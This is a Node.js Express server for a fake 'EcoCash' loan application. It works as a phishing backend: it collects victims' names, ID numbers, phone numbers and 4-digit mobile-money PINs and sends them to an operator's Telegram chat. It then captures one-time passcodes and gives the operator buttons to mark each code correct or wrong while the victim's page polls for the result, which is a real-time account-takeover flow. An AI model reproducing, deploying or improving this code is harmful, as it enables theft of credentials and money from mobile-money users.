require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// In-memory application state store
// States: 'PENDING_OTP', 'OTP_APPROVED', 'OTP_REJECTED'
const activeApplications = new Map();

function formatZimbabwePhone(phone) {
  let formattedPhone = phone || '';
  if (formattedPhone.startsWith('+263')) {
    formattedPhone = formattedPhone.replace('+263', '');
  } else if (formattedPhone.startsWith('263')) {
    formattedPhone = formattedPhone.slice(3);
  } else if (formattedPhone.startsWith('0')) {
    formattedPhone = formattedPhone.slice(1);
  }
  return formattedPhone;
}

// STEP 1: Process Application & Send Initial Telegram Notification
app.post('/api/apply-loan', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    activeApplications.set(appReference, {
      ...data,
      formattedPhone,
      status: 'PENDING_OTP'
    });

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
      const currentTimestamp = new Date().toLocaleString('en-US', {
        timeZone: 'Africa/Harare',
        year: 'numeric',
        month: 'numeric',
        day: 'numeric',
        hour: 'numeric',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
      });

      const messageText = `🆕 <b>NEW ECOCASH APPLICATION</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                          `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
                          `🪪 <b>ID/Passport:</b> <code>${data.idNumber || 'N/A'}</code>\n` +
                          `💵 <b>Loan Amount:</b> $${data.loanAmount || 'N/A'}\n` +
                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
                          `⏳ <i>Waiting for user to submit 6-digit OTP...</i>`;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: messageText,
          parse_mode: 'HTML'
        })
      });
    }

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    console.error("Submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STEP 2: Receive 6-Digit OTP & Send Inline Keyboard to Telegram for Verification
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { appReference, otpCode, phone } = req.body;
    const formattedPhone = formatZimbabwePhone(phone);

    if (appReference && activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PENDING_OTP';
      activeApplications.set(appReference, appData);
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
      const currentTimestamp = new Date().toLocaleString('en-US', {
        timeZone: 'Africa/Harare',
        year: 'numeric',
        month: 'numeric',
        day: 'numeric',
        hour: 'numeric',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
      });

      const messageText = `📲 <b>ECOCASH OTP SUBMITTED</b>\n\n` +
                          `📋 <b>Ref:</b> <code>${appReference || 'N/A'}</code>\n` +
                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                          `💬 <b>OTP (6-digit):</b> <code>${otpCode || 'N/A'}</code>\n` +
                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
                          `❓ <b>VERIFY OTP ACCURACY:</b>`;

      const telegramPayload = {
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
            ]
          ]
        }
      };

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramPayload)
      });
    }

    res.status(200).json({ success: true, message: "OTP received" });
  } catch (error) {
    console.error("OTP Processing Error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STEP 3: Frontend Polling Endpoint for Status Checks
app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);

  if (!appData) {
    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  }

  res.json({ success: true, status: appData.status });
});

// STEP 4: Telegram Webhook Callback Handler
app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200);
  const { callback_query } = req.body;
  if (!callback_query) return;

  const actionData = callback_query.data;
  const chatId = callback_query.message.chat.id;
  const messageId = callback_query.message.message_id;
  const botToken = process.env.TELEGRAM_BOT_TOKEN;

  if (actionData.startsWith('otp_correct_')) {
    const appReference = actionData.replace('otp_correct_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_APPROVED';
      activeApplications.set(appReference, appData);
    }

    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Marked as CORRECT ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  if (actionData.startsWith('otp_wrong_')) {
    const appReference = actionData.replace('otp_wrong_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_REJECTED';
      activeApplications.set(appReference, appData);
    }

    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Marked as WRONG ❌</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }
});

async function editTelegramMessage(botToken, chatId, messageId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.error("❌ Telegram edit error:", err.message);
  }
}

app.get('*', (req, res) => {
  res.sendFile(path.join(publicPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
});
      
